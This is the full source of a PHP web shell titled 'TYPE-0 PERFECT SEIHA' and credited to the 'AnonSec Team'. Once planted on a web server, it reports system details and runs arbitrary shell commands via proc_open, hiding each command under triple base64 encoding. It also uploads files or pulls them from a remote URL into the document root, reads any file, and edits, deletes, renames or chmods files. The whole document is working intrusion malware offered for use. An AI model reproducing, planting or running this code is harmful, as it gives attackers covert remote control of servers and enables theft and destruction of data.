<!DOCTYPE html>
<html>
<head>
    <title>Oo0zero0oO</title>
    <style>
	    @import url('https://fonts.googleapis.com/css?family=Dosis');
		@import url('https://fonts.googleapis.com/css?family=Bungee');
		@import url('https://fonts.googleapis.com/css?family=Russo+One');
        body {
            font-family: "Dosis", "Russo One", cursive;
            text-shadow: 0px 0px 1px #757575;
            background-color: #0a272c;
            color: #ffffff;
        }

        #content tr:hover {
            background-color: #636263;
            text-shadow: 0px 0px 10px #fff;
        }

        #content .first {
            background-color: #25383C;
        }

        #content .first:hover {
            background-color: #25383C;
            text-shadow: 0px 0px 1px #757575;
        }

        table {
            border: 1px #000000 dotted;
            table-layout: auto;
        }

        td {
            word-wrap: break-word;
        }

        a {
            color: #ffffff;
            text-decoration: none;
        }

        a:hover {
            color: #000000;
            text-shadow: 0px 0px 10px #ffffff;
        }

        input, select, textarea {
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius: 5px;
            border-radius: 5px;
        }

        .gas {
            background-color: #0a272c;
            color: #ffffff;
            cursor: pointer;
        }

        select {
            background-color: transparent;
            color: #ffffff;
        }

        select:after {
            cursor: pointer;
        }

        .linka {
            background-color: transparent;
            color: #ffffff;
        }

        .up {
            background-color: transparent;
            color: #fff;
        }

        option {
            background-color: #0a272c;
        }

        ::-webkit-file-upload-button {
            background: transparent;
            color: #fff;
            border-color: #fff;
            cursor: pointer;
        }

        .custom-button {
            display: inline-block;
            padding: 5px 10px;
            background-color: #0a272c; /* Warna latar */
            color: #fff; /* Warna teks */
            text-decoration: none; /* Menghilangkan underline link */
            border-color: #fff;
            border-radius: 5px; /* sudut border */
            font-size: 16px;
            cursor: pointer;
            margin-right: 10px; /* Jarak tombol */
        }

        .custom-button:hover {
            background-color: #0056b3; /* Warna latar dihover */
        }
    </style>
</head>
<body>
<center>
    <font face="Russo One" size="5">TYPE-0 PERFECT SEIHA</font>
</center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr>
        <td>
            <?php
            set_time_limit(0);
            error_reporting(0);

            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disf = "<font color='aqua'>NONE</font>";
            } else {
                $disf = "<font color='red'>" . $disfunc . "</font>";
            }

            function author()
            {
                echo "<center><br>Anon7 x Type-0</center><br>";
				echo "<center><br>AnonSec Team</center>";
                exit();
            }

            function cekdir()
            {
                if (isset($_GET['path'])) {
                    $lokasi = $_GET['path'];
                } else {
                    $lokasi = getcwd();
                }
                if (is_writable($lokasi)) {
                    return "<font color='green'>Greenjir</font>";
                } else {
                    return "<font color='red'>Not Greenjir</font>";
                }
            }

            function ekse($komend, $lokasi)
            {
                if (!function_exists("proc_open")) {
                    die("proc_open function disabled !");
                } elseif (!function_exists("base64_decode")) {
                    die("base64_decode function disabled !");
                }
                $komen = base64_decode(base64_decode(base64_decode($komend)));
                if (strpos($komend, "2>&1") === false) {
                    $komen = base64_decode(base64_decode(base64_decode($komend))) . " 2>&1";
                }
                $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
                echo "<textarea rows='15' cols='90'>" . htmlspecialchars(stream_get_contents($pipes[1])) . "</textarea><br><br>";
            }

            function cekroot()
            {
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    return "<font color='green'>Greenjir</font>";
                } else {
                    return "<font color='red'>Not Greenjir</font>";
                }
            }

            function xrmdir($dir)
            {
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    $path = $dir . '/' . $item;
                    if (is_dir($path)) {
                        xrmdir($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }
			function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

            function green($text)
            {
                echo "<center><font color='green'>" . $text . "</font></center>";
            }

            function red($text)
            {
                echo "<center><font color='red'>" . $text . "</font></center>";
            }

            echo "Server : <font color='aqua'>" . $_SERVER['SERVER_SOFTWARE'] . "</font><br>";
            echo "System : <font color='aqua'>" . php_uname() . "</font><br>";
            echo "User : <font color='aqua'>".@get_current_user()."&nbsp;</font>( <font color='aqua'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='aqua'>".@phpversion()."</font><br>";
echo "DisFunct : ".$disf."</font><br>";
echo "MySQL : ";
if (function_exists("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (function_exists("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WGET : ";
if (file_exists("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Perl : ";
if (file_exists("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Python : ";
if (file_exists("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pkexec : ";
if (function_exists("pkexec")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Bash : ";
if (file_exists("/bin/bash")) {
    echo "<font color=green>ON</font><br>";
} else {
    echo "<font color=red>OFF</font><br>";
}
echo "Directory : &nbsp;";
foreach($_POST as $key => $value){
	$_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
	$lokasi = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$lokasi = getcwd();
	$lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);
$webnya = $_SERVER['HTTP_HOST'];
$posisi = dirname(__FILE__);
$rootdirektori = $_SERVER['DOCUMENT_ROOT'];
$relativenjir = str_replace($rootdirektori, '', $posisi);



foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='aqua'><i><a href='".$_FILES['berkas']['name']."'>".$_FILES['berkas']['name']."</a></i></font><br><br>";
		} else {
			echo "<font color='red'>Failed to Upload !<br><br>";
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			exit("Filename cannot be empty !");
		}
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File Uploaded ! &nbsp;<font color='aqua'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
			echo "<font coloe='red'>Failed to Upload !<br><br>";
		}
	}
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://anon7.gay/manies.txt">&nbsp;<input type="text" name="namalink" class="up" size="4" placeholder="awesa.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';

echo '<form method="post" onsubmit="document.getElementById(\'komendnya\').value = btoa(btoa(btoa(document.getElementById(\'komendnya\').value)))">
'.@get_current_user().'@'.ipserv().':~ $ <input type="text" name="komend" id="komendnya" style="background-color: #25383C; color: #fff">
<input type="submit" name="eksekomend" value=" >> " class="up" style="cursor: pointer; border-color: #fff">
</form><br>';
if (isset($_POST['eksekomend'])) {
    ekse($_POST['komend'], $lokasi);
}

echo "</table><br>";



echo "</table><br>";
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0mmand</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
	echo "<tr><td>Current File : ".$_GET['fileloc'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
	author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
	if (is_dir($_POST['path'])) {
		xrmdir($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
			echo "string";
		}
	} elseif (is_file($_POST['path'])) {
		@unlink($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
	if (isset($_POST['chm0d'])) {
		$cm = @chmod($_POST['path'], $_POST['perm']);
		if ($cm == true) {
			green("Change Mod Success !");
		} else {
			red("Change Mod Failed !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
	if (isset($_POST['gantin'])) {
		$ren = @rename($_POST['path'], $_POST['newname']);
		if ($ren == true) {
			green("Change Name Success !");
		} else {
			red("Change Name Failed !");
		}
	}
	if (empty($_POST['name'])) {
		$namaawal = $_POST['newname'];
	} else {
		$namawal = $_POST['name'];
	}
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @file_put_contents($_POST['path'], $_POST['src']);
		if ($edit == true) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>".$_POST['path']."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
	echo "<tr>
	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
	echo statusnya($lokasi."/".$dir);
	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
	if(!is_file("$lokasi/$file")) continue;
	$size = filesize("$lokasi/$file")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\"><option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}
?>
